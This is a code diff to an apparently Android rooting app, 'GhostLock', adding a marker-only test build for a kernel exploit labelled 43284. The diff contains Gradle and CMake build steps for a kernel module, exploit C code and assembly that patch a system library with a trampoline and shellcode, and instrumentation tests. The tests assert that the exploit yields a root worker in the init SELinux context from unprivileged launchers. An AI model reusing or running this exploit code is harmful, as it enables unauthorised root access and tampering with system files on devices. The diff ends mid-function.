@@ -1,0 +1,1181 @@
+--- a/app/build.gradle.kts
++++ b/app/build.gradle.kts
+@@ -19,6 +19,8 @@
+ 
+ val appName = "GhostLock"
+ val appVersionName = "2.0.12"
++//TODO(m0-marker-20261029): temporary marker fixture build gate; remove after M0 device validation.
++val m0MarkerEnabled = providers.gradleProperty("m0Marker").orNull == "true"
+ 
+ val gitVersionCode = runCatching {
+     providers.exec {
+@@ -38,6 +40,50 @@
+  * still under $HOME, which is what the podman VM can mount. */
+ val lkmCacheDir = layout.buildDirectory.dir("lkm").get().asFile
+ val lkmGeneratedAssets = layout.buildDirectory.dir("generated/lkmAssets")
++
++/** Builds the isolated M0 source copy and its A301SO-specific KO under the real build root. */
++abstract class BuildM0MarkerKoTask : org.gradle.api.DefaultTask() {
++    @get:org.gradle.api.tasks.InputDirectory
++    abstract val sourceDir: org.gradle.api.file.DirectoryProperty
++
++    @get:org.gradle.api.tasks.OutputDirectory
++    abstract val outputDir: org.gradle.api.file.DirectoryProperty
++
++    @get:javax.inject.Inject
++    abstract val execOps: org.gradle.process.ExecOperations
++
++    @org.gradle.api.tasks.TaskAction
++    fun buildFixture() {
++        val source = sourceDir.get().asFile
++        val output = outputDir.get().asFile
++        source.copyRecursively(output, overwrite = true)
++        val lkm = File(output, "lkm")
++        val ko = File(output, "ko/dfroot-android13-5.15.ko")
++        File(lkm, "m0_dfroot.ko").delete()
++        execOps.exec {
++            commandLine(
++                "podman", "run", "--rm", "--platform", "linux/amd64",
++                "-v", "${lkm.absolutePath}:/src:rw", "-w", "/src",
++                "ghcr.io/ylarod/ddk-min:android13-5.15-20260828", "make", "-j2", "all",
++            )
++        }.assertNormalExitValue()
++        val built = File(lkm, "m0_dfroot.ko")
++        check(built.isFile && built.length() > 0L) { "M0 DDK did not produce a KO" }
++        check(ko.parentFile.mkdirs() || ko.parentFile.isDirectory) {
++            "M0 build output directory is unavailable"
++        }
++        built.copyTo(ko, overwrite = true)
++        check(ko.isFile && ko.length() == built.length()) { "M0 KO copy changed its byte count" }
++    }
++}
++
++//TODO(m0-marker-20261029): build the isolated A301SO-only fixture KO with its pinned DDK image.
++val m0BuildDirectory = layout.buildDirectory.dir("m0/fixture/43284glued")
++val buildM0MarkerKo = tasks.register<BuildM0MarkerKoTask>("buildM0MarkerKo") {
++    sourceDir.set(layout.projectDirectory.dir("src/main/cpp/43284glued/m0"))
++    outputDir.set(m0BuildDirectory)
++    outputs.upToDateWhen { false }
++}
+ 
+ /** The repository's SINGLE NDK authority (the root script resolves the same keys;
+  *  AGP 8's ApplicationExtension exposes no ndkDirectory). */
+@@ -103,6 +149,14 @@
+         versionCode = gitVersionCode
+         versionName = appVersionName
+         testInstrumentationRunner = "androidx.test.runner.AndroidJUnitRunner"
++        externalNativeBuild {
++            cmake {
++                arguments += "-DGHOSTLOCK_M0_MARKER=${if (m0MarkerEnabled) "ON" else "OFF"}"
++                if (m0MarkerEnabled) {
++                    arguments += "-DGHOSTLOCK_M0_SOURCE_DIR=${m0BuildDirectory.get().asFile.absolutePath}"
++                }
++            }
++        }
+     }
+     androidResources {
+         localeFilters += listOf("en", "zh-rCN")
+@@ -146,6 +200,7 @@
+         }
+         debug {
+             signingConfig = signingConfigs.getByName(if (keystoreFile != null) "release" else "debug")
++            buildConfigField("boolean", "M0_MARKER", m0MarkerEnabled.toString())
+         }
+     }
+     buildFeatures {
+@@ -184,6 +239,13 @@
+         cmake {
+             path = file("src/main/cpp/CMakeLists.txt")
+         }
++    }
++}
++
++if (m0MarkerEnabled) {
++    tasks.named("preBuild") { dependsOn(buildM0MarkerKo) }
++    tasks.configureEach {
++        if (name.contains("CMake", ignoreCase = true)) dependsOn(buildM0MarkerKo)
+     }
+ }
+ 
+--- a/app/src/main/cpp/43284glued/CMakeLists.txt
++++ b/app/src/main/cpp/43284glued/CMakeLists.txt
+@@ -6,6 +6,51 @@
+ # Preconditions: the parent project supplies Android C/ASM toolchains and AGP
+ # output directories; the checked-in helper hash matches the import manifest.
+ # Phase: application native build; payload executables are not run by CMake.
++
++#TODO(m0-marker-20261029): isolate the approved marker-only device fixture; remove this
++#branch and the matching Gradle property after the M0 device gate, keeping the default
++#upstream CMake path below byte-identical.
++if(GHOSTLOCK_M0_MARKER)
++    if(NOT DEFINED GHOSTLOCK_M0_SOURCE_DIR OR NOT IS_DIRECTORY "${GHOSTLOCK_M0_SOURCE_DIR}")
++        message(FATAL_ERROR "M0 fixture source directory was not staged by Gradle")
++    endif()
++    set(M0_SOURCE_DIR "${GHOSTLOCK_M0_SOURCE_DIR}")
++    set(M0_KO_FILES
++        "${M0_SOURCE_DIR}/ko/dfroot-android12-5.10.ko"
++        "${M0_SOURCE_DIR}/ko/dfroot-android13-5.10.ko"
++        "${M0_SOURCE_DIR}/ko/dfroot-android13-5.15.ko"
++        "${M0_SOURCE_DIR}/ko/dfroot-android14-5.15.ko"
++        "${M0_SOURCE_DIR}/ko/dfroot-android14-6.1.ko"
++        "${M0_SOURCE_DIR}/ko/dfroot-android15-6.6.ko"
++        "${M0_SOURCE_DIR}/ko/dfroot-android16-6.12.ko"
++        "${M0_SOURCE_DIR}/ko/dfroot-android17-6.18.ko"
++    )
++    add_executable(glued43284_exec
++        "${M0_SOURCE_DIR}/exp.c"
++        "${M0_SOURCE_DIR}/m0_marker.c"
++        "${M0_SOURCE_DIR}/libcxx.S"
++        "${M0_SOURCE_DIR}/elf_parser.c"
++    )
++    target_include_directories(glued43284_exec PRIVATE "${M0_SOURCE_DIR}")
++    target_compile_options(glued43284_exec PRIVATE
++        -Wall -Wextra -fno-stack-protector -fomit-frame-pointer
++        "-Wa,-I${M0_SOURCE_DIR}"
++    )
++    target_link_libraries(glued43284_exec PRIVATE log)
++    target_link_options(glued43284_exec PRIVATE
++        -fPIE -pie -pthread -Wl,-z,max-page-size=16384
++    )
++    set_target_properties(glued43284_exec PROPERTIES
++        PREFIX "lib"
++        SUFFIX ".so"
++        OUTPUT_NAME "43284Glued"
++        RUNTIME_OUTPUT_DIRECTORY "${CMAKE_LIBRARY_OUTPUT_DIRECTORY}"
++    )
++    set_source_files_properties("${M0_SOURCE_DIR}/exp.c" PROPERTIES
++        OBJECT_DEPENDS "${M0_KO_FILES};${M0_SOURCE_DIR}/splicehelper"
++    )
++    return()
++endif()
+ 
+ set(DFROOT_SOURCE_DIR "${CMAKE_CURRENT_SOURCE_DIR}")
+ set(DFROOT_SPLICEHELPER "${DFROOT_SOURCE_DIR}/splicehelper")
+--- a/app/src/main/kotlin/com/ghostlock/app/backend/core/ExecutableRunEnvironment.kt
++++ b/app/src/main/kotlin/com/ghostlock/app/backend/core/ExecutableRunEnvironment.kt
+@@ -1,12 +1,13 @@
+ package com.ghostlock.app.backend.core
+ 
++import com.ghostlock.app.BuildConfig
+ import java.io.File
+ 
+ /** Builds the backend-scoped environment inherited by a direct Glued executable child.
+  *
+  * @param backendKey fixed identity selected before process creation.
+  * @param runDirectory launcher-owned directory for this single invocation.
+- * @return only the allowed 43499 path variables; other backends receive no additions.
++ * @return the allowed 43499 path variables, the M0-only 43284 run path, or no additions.
+  * @note App and Shizuku launchers call the same mapper but retain separate run-directory owners.
+  */
+ internal object ExecutableRunEnvironment {
+@@ -14,11 +15,14 @@
+      *
+      * @param backendKey fixed Glued identity.
+      * @param runDirectory path owned by the selected App or Shizuku launcher.
+-     * @return three path variables for 43499-Glued, or an empty map for other backends.
++     * @return three path variables for 43499-Glued, the M0 run path for 43284, or an empty map.
+      */
+     fun variables(backendKey: String, runDirectory: File): Map<String, String> {
++        val home = runDirectory.absolutePath
++        if (backendKey == "43284Glued" && BuildConfig.M0_MARKER) {
++            return mapOf("GHOSTLOCK_HOME" to home)
++        }
+         if (backendKey != "43499-Glued") return emptyMap()
+-        val home = runDirectory.absolutePath
+         return mapOf(
+             "GHOSTLOCK_HOME" to home,
+             "TMPDIR" to home,
+--- a/app/src/main/kotlin/com/ghostlock/app/backend/core/ExecutableShizukuHost.kt
++++ b/app/src/main/kotlin/com/ghostlock/app/backend/core/ExecutableShizukuHost.kt
+@@ -2,8 +2,10 @@
+ 
+ import android.content.Context
+ import android.os.Bundle
++import com.ghostlock.app.BuildConfig
+ import com.ghostlock.app.shizuku.host.ShizukuBackendHost
+ import java.io.File
++import java.io.FileInputStream
+ import java.io.FileOutputStream
+ import java.io.RandomAccessFile
+ import java.util.UUID
+@@ -71,7 +73,9 @@
+         }
+         val stagedBinary = packagedBinary() ?: return reject("exec:host:binary-unavailable", ERR_BINARY)
+         val root = File("/data/local/tmp/ghostlock-glue/" + backendId)
+-        val directory = File(root, UUID.randomUUID().toString())
++        val runId = if (BuildConfig.M0_MARKER) UUID.randomUUID().toString().replace("-", "")
++        else UUID.randomUUID().toString()
++        val directory = File(root, runId)
+         if (!directory.mkdirs()) return reject("exec:host:run-dir-unavailable", ERR_IO)
+         directory.setReadable(false, false)
+         directory.setWritable(false, false)
+@@ -90,6 +94,18 @@
+                     target.setWritable(true, true)
+                 }
+             }
++            if (BuildConfig.M0_MARKER && binaryName == "lib43284Glued.so") {
++                val worker = File(directory, "m0-worker")
++                FileInputStream(stagedBinary).use { input ->
++                    FileOutputStream(worker).use { output -> input.copyTo(output) }
++                }
++                check(worker.setReadable(false, false)) { "stage:m0-worker-read-reset" }
++                check(worker.setWritable(false, false)) { "stage:m0-worker-write-reset" }
++                check(worker.setExecutable(false, false)) { "stage:m0-worker-exec-reset" }
++                check(worker.setReadable(true, true)) { "stage:m0-worker-read-owner" }
++                check(worker.setWritable(true, true)) { "stage:m0-worker-write-owner" }
++                check(worker.setExecutable(true, true)) { "stage:m0-worker-exec-owner" }
++            }
+         } catch (problem: ExecutableStageException) {
+             runCatching { directory.deleteRecursively() }
+             reason = "exec:host:" + problem.reasonCode
+--- /dev/null
++++ b/app/src/androidTest/kotlin/com/ghostlock/app/backend/43284glued/M0MarkerGateTest.kt
+@@ -0,0 +1,231 @@
++package com.ghostlock.app.backend.cve43284glued
++
++import android.content.pm.PackageManager
++import android.os.Bundle
++import android.os.SystemClock
++import android.system.Os
++import android.system.OsConstants
++import android.util.Log
++import androidx.test.ext.junit.runners.AndroidJUnit4
++import androidx.test.platform.app.InstrumentationRegistry
++import com.ghostlock.app.BuildConfig
++import com.ghostlock.app.backend.core.ExecutableHostProtocol
++import com.ghostlock.app.backend.core.ExecutableRunFileStager
++import com.ghostlock.app.shizuku.ShizukuBackendClient
++import com.ghostlock.app.shizuku.host.ShizukuBackendHosts
++import kotlinx.coroutines.delay
++import kotlinx.coroutines.runBlocking
++import org.junit.Assert.assertEquals
++import org.junit.Assert.assertFalse
++import org.junit.Assert.assertTrue
++import org.junit.Test
++import org.junit.runner.RunWith
++import rikka.shizuku.Shizuku
++import java.io.ByteArrayOutputStream
++import java.io.File
++import java.security.MessageDigest
++import java.util.UUID
++import java.util.concurrent.TimeUnit
++
++/**
++ * Exercises the approved 43284 M0 marker-only ELF through the two existing launchers.
++ *
++ * @note This test bypasses production Flow dispatch and never opens or executes Payload/Finish.
++ */
++@RunWith(AndroidJUnit4::class)
++class M0MarkerGateTest {
++    /** Runs the fixture ELF as the app UID and retains no run state after verified worker exit. */
++    @Test
++    fun appLauncherCompletesRootReadyAndSingleReleaseMarkers() {
++        val context = InstrumentationRegistry.getInstrumentation().targetContext
++        assertTrue("M0 fixture build flag is absent", BuildConfig.M0_MARKER)
++        val runDirectory = createAppRunDirectory(context.cacheDir)
++        val binary = packagedBinary(context)
++        val worker = File(runDirectory, "m0-worker")
++        val payload = File(runDirectory, "payload")
++        val finish = File(runDirectory, "finish.sh")
++        val sentinel = File(runDirectory, "m0-execution-sentinel")
++        val canary = "#!/system/bin/sh\nprintf executed > ./m0-execution-sentinel\n".toByteArray()
++        val payloadHash = sha256(canary)
++        val finishHash = sha256(canary)
++        var runtime: AndroidIpSecRuntime? = null
++        var safeToDelete = false
++
++        try {
++            ExecutableRunFileStager.stage(runDirectory, "m0-worker", binary.readBytes())
++            Os.chmod(worker.absolutePath, OWNER_RWX)
++            ExecutableRunFileStager.stage(runDirectory, "payload", canary)
++            ExecutableRunFileStager.stage(runDirectory, "finish.sh", canary)
++            runtime = AndroidIpSecRuntime.create(context)
++            val command = ArrayList<String>(runtime.arguments.size + 1).apply {
++                add(binary.absolutePath)
++                addAll(runtime.arguments)
++            }
++            val logFile = File(runDirectory, "run.log")
++            val child = ProcessBuilder(command)
++                .directory(runDirectory)
++                .redirectErrorStream(true)
++                .redirectOutput(logFile)
++                .apply { environment()["GHOSTLOCK_HOME"] = runDirectory.absolutePath }
++                .start()
++            val completed = child.waitFor(60, TimeUnit.SECONDS)
++            if (!completed) {
++                child.destroyForcibly()
++                child.waitFor(5, TimeUnit.SECONDS)
++            }
++            runtime.close()
++            runtime = null
++            assertTrue("M0 ELF did not exit within 60 seconds; run retained", completed)
++            assertEquals("M0 ELF exit", 0, child.exitValue())
++
++            val output = logFile.readText()
++            val readyFile = File(runDirectory, "ROOT_READY")
++            assertTrue("ROOT_READY missing; run retained", readyFile.isFile)
++            val readyText = readyFile.readText()
++            val ready = readyText.lineSequence().filter { '=' in it }
++                .associate { it.substringBefore('=') to it.substringAfter('=') }
++            assertEquals("1", ready["version"])
++            assertEquals(runDirectory.name, ready["run_id"])
++            assertEquals(Os.getuid().toString(), ready["launcher_uid"])
++            assertEquals("0", ready["worker_uid"])
++            assertEquals("0", ready["worker_euid"])
++            assertEquals("u:r:init:s0", ready["worker_context"])
++            assertTrue(ready["worker_pid"].orEmpty().toInt() > 1)
++            assertEquals("0700", Os.stat(runDirectory.absolutePath).st_mode.toPermissionString())
++            assertEquals("0600", Os.stat(readyFile.absolutePath).st_mode.toPermissionString())
++            assertEquals(Os.getuid(), Os.stat(readyFile.absolutePath).st_uid)
++            assertTrue("RELEASE_FINISH was not consumed", !File(runDirectory, "RELEASE_FINISH").exists())
++            assertEquals(payloadHash, sha256(payload.readBytes()))
++            assertEquals(finishHash, sha256(finish.readBytes()))
++            assertFalse("payload/finish sentinel was created", sentinel.exists())
++            assertTrue("M0 release evidence missing: $output", output.contains("M0_RELEASE_FINISH_CONSUMED=1"))
++            assertTrue("M0 worker-exit evidence missing: $output", output.contains("M0_WORKER_EXITED=1"))
++            assertTrue("SELinux mutation evidence missing: $output", output.contains("M0_SELINUX_CHANGED=0"))
++            assertFalse("root worker PID remains visible", File("/proc/${ready["worker_pid"]}").exists())
++            safeToDelete = true
++            Log.i(
++                TAG,
++                "route=APP run_dir=${runDirectory.absolutePath} launcher_uid=${Os.getuid()} " +
++                    "worker_pid=${ready["worker_pid"]} worker_uid=0 worker_context=${ready["worker_context"]} " +
++                    "run_dir_context=${ready["run_dir_context"]} ready_sha256=${sha256(readyText.toByteArray())} " +
++                    "payload_sha256=$payloadHash finish_sha256=$finishHash release_consumed=true worker_exited=true " +
++                    "host_exit=${child.exitValue()} canary_unchanged=true sentinel_absent=true",
++            )
++        } finally {
++            runCatching { runtime?.close() }
++            if (safeToDelete) {
++                assertTrue("exact App M0 run directory cleanup failed", runDirectory.deleteRecursively())
++                assertFalse("exact App M0 run directory remains", runDirectory.exists())
++            } else {
++                Log.e(TAG, "M0_RUN_DIR_PRESERVED=${runDirectory.absolutePath}")
++            }
++        }
++    }
++
++    /** Runs through the common Shizuku UserService and leaves its exact runDir for host audit. */
++    @Test
++    fun shizukuLauncherCompletesRootReadyAndSingleReleaseMarkers() = runBlocking {
++        val context = InstrumentationRegistry.getInstrumentation().targetContext
++        assertTrue("M0 fixture build flag is absent", BuildConfig.M0_MARKER)
++        val binderReachable = runCatching { Shizuku.pingBinder() }.getOrDefault(false)
++        val permissionGranted = binderReachable && runCatching {
++            Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED
++        }.getOrDefault(false)
++        val reasons = ShizukuBackendClient(
++            context,
++            ShizukuBackendHosts.CVE_43284_GLUED,
++        ).availabilityReasons()
++        assertTrue("Shizuku preflight failed: $reasons", binderReachable && permissionGranted && reasons.isEmpty())
++        assertEquals("Shizuku UID", 2000, Shizuku.getUid())
++        assertTrue("Shizuku context is not shell: ${Shizuku.getSELinuxContext()}",
++            Shizuku.getSELinuxContext()?.contains("u:r:shell:s0") == true)
++
++        val binary = packagedBinary(context)
++        val canary = "#!/system/bin/sh\nprintf executed > ./m0-execution-sentinel\n".toByteArray()
++        val client = ShizukuBackendClient(context, ShizukuBackendHosts.CVE_43284_GLUED)
++        val config = Bundle().apply {
++            putStringArrayList(ExecutableHostProtocol.KEY_ARGUMENTS, arrayListOf())
++            putStringArrayList(ExecutableHostProtocol.KEY_FILE_NAMES, arrayListOf("payload", "finish.sh"))
++            putByteArray(ExecutableHostProtocol.fileKey("payload"), canary)
++            putByteArray(ExecutableHostProtocol.fileKey("finish.sh"), canary)
++        }
++        var runDirectory = ""
++        var disconnected = false
++        try {
++            assertEquals("Shizuku host prepare", 0, client.prepare(config, ByteArray(0)) {})
++            val hostPid = client.start()
++            assertTrue("Shizuku host did not return child PID: $hostPid", hostPid > 0)
++            val output = ByteArrayOutputStream()
++            var offset = 0L
++            val deadline = SystemClock.elapsedRealtime() + 75_000L
++            var state = ExecutableHostProtocol.STATE_RUNNING
++            while (state == ExecutableHostProtocol.STATE_RUNNING && SystemClock.elapsedRealtime() < deadline) {
++                val chunk = client.readLog(offset, 32 * 1024)
++                if (chunk.isNotEmpty()) {
++                    output.write(chunk)
++                    offset += chunk.size.toLong()
++                }
++                state = client.state()
++                if (state == ExecutableHostProtocol.STATE_RUNNING) delay(200L)
++            }
++            assertEquals("M0 host terminal state", ExecutableHostProtocol.STATE_TERMINAL, state)
++            val finalChunk = client.readLog(offset, 32 * 1024)
++            if (finalChunk.isNotEmpty()) output.write(finalChunk)
++            val hostEvidence = String(client.verify(), Charsets.UTF_8)
++            runDirectory = Regex("(?m)^run_dir=(.+)$").find(hostEvidence)?.groupValues?.get(1).orEmpty()
++            assertTrue("Shizuku run directory missing: $hostEvidence", runDirectory.isNotBlank())
++            val log = output.toString(Charsets.UTF_8.name())
++            assertTrue("M0 ROOT_READY evidence missing: $log", log.contains("M0_ROOT_READY=run:"))
++            assertTrue("M0 release evidence missing: $log", log.contains("M0_RELEASE_FINISH_CONSUMED=1"))
++            assertTrue("M0 worker exit evidence missing: $log", log.contains("M0_WORKER_EXITED=1"))
++            assertTrue("SELinux mutation evidence missing: $log", log.contains("M0_SELINUX_CHANGED=0"))
++            assertTrue("M0 host exit is not zero: $hostEvidence", hostEvidence.contains("exit=0"))
++            assertTrue("Shizuku run id is not 32 lowercase hex: $runDirectory",
++                runDirectory.substringAfterLast('/').matches(Regex("[0-9a-f]{32}")))
++            Log.i(
++                TAG,
++                "route=SHIZUKU launcher_uid=${Shizuku.getUid()} launcher_context=${Shizuku.getSELinuxContext()} " +
++                    "run_dir=$runDirectory elf_sha256=${sha256(binary.readBytes())} host_pid=$hostPid " +
++                    "host_evidence=${hostEvidence.replace('\n', '|')} log=${log.replace('\n', '|')} " +
++                    "canary_sha256=${sha256(canary)} release_consumed=true worker_exited=true",
++            )
++        } finally {
++            client.disconnect(remove = true)
++            disconnected = true
++            if (runDirectory.isNotBlank()) {
++                Log.i(TAG, "M0_SHIZUKU_RUN_DIR_RETAINED_FOR_AUDIT=$runDirectory")
++            }
++            assertTrue("Shizuku UserService removal callback did not complete", disconnected)
++        }
++    }
++
++    /** Creates one fresh app-owned 32-hex run directory with owner-only permissions. */
++    private fun createAppRunDirectory(cacheDirectory: File): File {
++        val root = File(cacheDirectory, "m0-marker")
++        check(root.isDirectory || root.mkdirs()) { "M0 app run root unavailable" }
++        Os.chmod(root.absolutePath, OWNER_RWX)
++        val runDirectory = File(root, UUID.randomUUID().toString().replace("-", ""))
++        check(runDirectory.mkdir()) { "M0 app run directory unavailable" }
++        Os.chmod(runDirectory.absolutePath, OWNER_RWX)
++        return runDirectory
++    }
++
++    /** Resolves the single packaged 43284 executable and rejects a missing/non-executable file. */
++    private fun packagedBinary(context: android.content.Context): File =
++        File(context.applicationInfo.nativeLibraryDir, "lib43284Glued.so").also {
++            check(it.isFile && it.canExecute()) { "M0 packaged 43284 ELF unavailable" }
++        }
++
++    /** Computes SHA-256 using an in-memory digest and emits lowercase hexadecimal. */
++    private fun sha256(bytes: ByteArray): String = MessageDigest.getInstance("SHA-256")
++        .digest(bytes).joinToString("") { "%02x".format(it.toInt() and 0xff) }
++
++    /** Formats the low permission bits as four-digit octal for stable marker evidence. */
++    private fun Int.toPermissionString(): String =
++        "0" + ((this and 0x1ff).toString(8).padStart(3, '0'))
++
++    private companion object {
++        private const val TAG = "M0MarkerGate"
++        private val OWNER_RWX = OsConstants.S_IRUSR or OsConstants.S_IWUSR or OsConstants.S_IXUSR
++    }
++}
+--- a/app/src/main/cpp/43284glued/exp.c
++++ b/app/src/main/cpp/43284glued/m0/exp.c
+@@ -13,9 +13,12 @@
+ #include <sys/wait.h>
+ #include <sys/stat.h>
+ #include <sys/utsname.h>
++#include <sys/xattr.h>
++#include <time.h>
+ #include <netinet/in.h>
+ #include <arpa/inet.h>
+ #include "aes256.h"
++#include "m0_marker.h"
+ 
+ #define eos(s) (s + strlen(s))
+ 
+@@ -241,6 +244,7 @@
+ extern uint32_t libcxx_len;
+ extern char libcxx_first_inst_copy[];
+ extern uint32_t libcxx_ko_target_off;
++extern uint32_t libcxx_m0_worker_arg_off;
+ 
+ asm(
+     ".section .rodata\n"
+@@ -381,15 +385,16 @@
+     return ret;
+ }
+ 
+-static void cleanup(void) {
+-    if (!g_libcxx_r.valid) return;
++static int cleanup(void) {
++    if (!g_libcxx_r.valid) return 0;
+     printf("\n=== cleanup ===\n");
+     printf("restoring trampoline in %s\n", g_libcxx_r.lib);
+-    patch_file_cbc(g_libcxx_r.lib, (char *)g_libcxx_r.tramp_orig, 16,
+-                   (size_t)g_libcxx_r.tramp_aligned, 0);
++    int trampoline_result = patch_file_cbc(g_libcxx_r.lib,
++        (char *)g_libcxx_r.tramp_orig, 16, (size_t)g_libcxx_r.tramp_aligned, 0);
+     printf("restoring shellcode in %s\n", g_libcxx_r.lib);
+-    patch_file_cbc(g_libcxx_r.lib, g_libcxx_r.shell_orig, g_libcxx_r.shell_padded,
+-                   (size_t)g_libcxx_r.shell_off, 0);
++    int shellcode_result = patch_file_cbc(g_libcxx_r.lib, g_libcxx_r.shell_orig,
++        g_libcxx_r.shell_padded, (size_t)g_libcxx_r.shell_off, 0);
++    return trampoline_result == 0 && shellcode_result == 0 ? 0 : -1;
+ }
+ 
+ int find_hook_target(const char *lib, const char *sym,
+@@ -537,8 +542,8 @@
+     return 0;
+ }
+ 
+-static int exploit(void) {
+-    printf("\n=== exploit (patching files) ===\n");
++static int exploit(const char *run_directory) {
++    printf("\n=== M0 marker fixture exploit ===\n");
+ 
+     int rc = 3;
+     if (patch_helper()) goto done;
+@@ -551,50 +556,38 @@
+     rc = 2;
+     usleep(500000);
+     
+-    printf("\n=== init  ===\n");
++    printf("\n=== M0 UMH trigger ===\n");
+     createOrphanProcess();
+-
+-    static const struct {
+-        const char *path;
+-        const char *msg;
+-        int         rc;
+-    } markers[] = {
+-        { "/dev/df",    "libc++: loading custom module",                    -1 },
+-        { "/dev/dfm0",  "kernel module: launching bootstrap",               -1 },
+-        { "/dev/dfm1",  "bootstrap: loading app preferences file",          -1 },
+-        { "/dev/dfme0", "bootstrap: ERROR - reading prefs failed",           1 },
+-        { "/dev/dfm2",  "bootstrap: cloning zygote env",                    -1 },
+-        { "/dev/dfmw0", "bootstrap: WARNING - clone zygote env failed",     -1 },
+-        { "/dev/dfm3",  "bootstrap: setting partitions ro",                 -1 },
+-        { "/dev/dfmw1", "bootstrap: WARNING - set partitions ro failed",    -1 },
+-        { "/dev/dfm4",  "bootstrap: disabling ksu modules",                 -1 },
+-        { "/dev/dfme1", "bootstrap: ERROR - disable modules failed",         1 },
+-        { "/dev/dfm5",  "bootstrap: starting SU daemon",                    -1 },
+-        { "/dev/dfm6",  "ksud start: SUCCESS",                               0 },
+-        { "/dev/dfme2", "ksud start: ERROR - ksud nonzero exit",             1 },
+-    };
+-    int seen[sizeof(markers)/sizeof(markers[0])] = {0};
+-
+-    for (int elapsed = 0; elapsed < 10000; elapsed += 10) {
++    char ready_path[320];
++    if (snprintf(ready_path, sizeof(ready_path), "%s/ROOT_READY", run_directory) >=
++        (int)sizeof(ready_path)) { rc = 4; goto done; }
++    for (int elapsed = 0; elapsed < 15000; elapsed += 10) {
+         usleep(10000);
+-        for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
+-            if (!seen[j] && access(markers[j].path, F_OK) == 0) {
+-                seen[j] = 1;
+-                printf("%s\n", markers[j].msg);
+-                if (markers[j].rc >= 0) { rc = markers[j].rc; goto done; }
+-            }
+-        }
+-    }
+-    printf("timeout: ERROR - check logcat & dmesg\n");
++        if (m0_root_ready_exists(run_directory) == 0) { rc = 0; goto done; }
++    }
++    printf("M0_ROOT_READY_TIMEOUT=1\n");
+ done:
+-    if (rc == 3) printf("patch: ERROR - failed to patch files\n");
++    if (rc == 3) printf("M0_PATCH_FAILED=1\n");
+     return rc;
+ }
+ 
+ int main(int argc, char **argv) {
+     setvbuf(stdout, NULL, _IONBF, 0);
++    if (argc == 3 && strcmp(argv[1], "--m0-root-worker") == 0)
++        return m0_root_worker_main(argv[2]);
++    const char *run_directory = getenv("GHOSTLOCK_HOME");
++    if (run_directory == NULL || m0_prepare_worker_argument(run_directory,
++            libcxx_data + libcxx_m0_worker_arg_off, 267) != 0) {
++        fprintf(stderr, "M0_RUN_DIRECTORY_INVALID=1\n");
++        return 2;
++    }
+     if (setup(argc, argv) != 0) return 2;
+-    int rc = exploit();
+-    cleanup();
+-    return rc;
+-}
++    int rc = exploit(run_directory);
++    int restore_result = cleanup();
++    if (restore_result != 0) {
++        printf("M0_KERNEL_FILE_RESTORE_FAILED=1\n");
++        return 5;
++    }
++    if (rc != 0) return rc;
++    return m0_launcher_release(run_directory);
++}
+--- a/app/src/main/cpp/43284glued/libcxx.S
++++ b/app/src/main/cpp/43284glued/m0/libcxx.S
+@@ -6,6 +6,7 @@
+     .global libcxx_data
+     .global libcxx_len
+     .global libcxx_first_inst_copy
++    .global libcxx_m0_worker_arg_off
+     .data
+ 
+ 
+@@ -27,6 +28,13 @@
+     .global libcxx_ko_target_off
+ libcxx_ko_target_off:
+     .int ko_target - libcxx_data
++
++m0_worker_arg:
++    .asciz "glk_worker="
++    .skip 256, 0
++    .balign 4
++libcxx_m0_worker_arg_off:
++    .int m0_worker_arg - libcxx_data
+ 
+     .align 4
+ 
+@@ -116,7 +124,9 @@
+     str     x1, [sp]
+     adr     x1, ko_target
+     str     x1, [sp, 8]
+-    str     xzr, [sp, 16]
++    adr     x1, m0_worker_arg
++    str     x1, [sp, 16]
++    str     xzr, [sp, 24]
+     adr     x0, exe_path
+     mov     x1, sp
+     mov     x2, xzr
+--- /dev/null
++++ b/app/src/main/cpp/43284glued/m0/m0_marker.c
+@@ -0,0 +1,339 @@
++#include "m0_marker.h"
++
++#include <errno.h>
++#include <signal.h>
++#include <stdbool.h>
++#include <stdio.h>
++#include <stdlib.h>
++#include <string.h>
++#include <sys/stat.h>
++#include <sys/types.h>
++#include <sys/xattr.h>
++#include <time.h>
++#include <unistd.h>
++#include <fcntl.h>
++
++#define M0_PATH_CAPACITY 256
++#define M0_MARKER_CAPACITY 1024
++
++/** Identity fields parsed from the fixed ROOT_READY wire sequence. */
++struct M0Ready {
++    char run_id[33];
++    unsigned int launcher_uid;
++    int worker_pid;
++    unsigned long long worker_starttime;
++    unsigned long long run_dir_dev;
++    unsigned long long run_dir_ino;
++    unsigned int worker_uid;
++    unsigned int worker_euid;
++    char worker_context[128];
++    char run_dir_context[128];
++};
++
++/** Accept an absolute, bounded path and extract its final 32-lowercase-hex run ID. */
++static int m0_validate_run_directory(const char *path, char run_id[33]) {
++    size_t length = strnlen(path, M0_PATH_CAPACITY);
++    if (path[0] != '/' || length < 34 || length >= M0_PATH_CAPACITY || path[length - 33] != '/') return -1;
++    memcpy(run_id, path + length - 32, 32);
++    run_id[32] = '\0';
++    for (size_t i = 0; i < 32; ++i) {
++        if (!((run_id[i] >= '0' && run_id[i] <= '9') ||
++              (run_id[i] >= 'a' && run_id[i] <= 'f'))) return -1;
++    }
++    for (size_t i = 0; i < length; ++i) {
++        const char value = path[i];
++        if (!((value >= 'a' && value <= 'z') || (value >= 'A' && value <= 'Z') ||
++              (value >= '0' && value <= '9') || value == '/' || value == '.' ||
++              value == '_' || value == '-')) return -1;
++        if (value == '.' && i + 1 < length && path[i + 1] == '.') return -1;
++    }
++    return 0;
++}
++
++/** Write all marker bytes, retrying EINTR and rejecting short completion. */
++static int m0_write_all(int fd, const char *bytes, size_t length) {
++    size_t offset = 0;
++    while (offset < length) {
++        ssize_t count = write(fd, bytes + offset, length - offset);
++        if (count < 0 && errno == EINTR) continue;
++        if (count <= 0) return -1;
++        offset += (size_t)count;
++    }
++    return 0;
++}
++
++/** Read a procfs context string and remove its optional trailing newline. */
++static int m0_read_context(char *output, size_t capacity) {
++    int fd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
++    if (fd < 0) return -1;
++    ssize_t count = read(fd, output, capacity - 1);
++    close(fd);
++    if (count <= 0) return -1;
++    while (count > 0 && (output[count - 1] == '\n' || output[count - 1] == '\0')) --count;
++    output[count] = '\0';
++    return 0;
++}
++
++/** Read Linux proc field 22 (starttime) for this worker process. */
++static int m0_read_starttime(unsigned long long *starttime) {
++    char line[2048];
++    int fd = open("/proc/self/stat", O_RDONLY | O_CLOEXEC);
++    if (fd < 0) return -1;
++    ssize_t count = read(fd, line, sizeof(line) - 1);
++    close(fd);
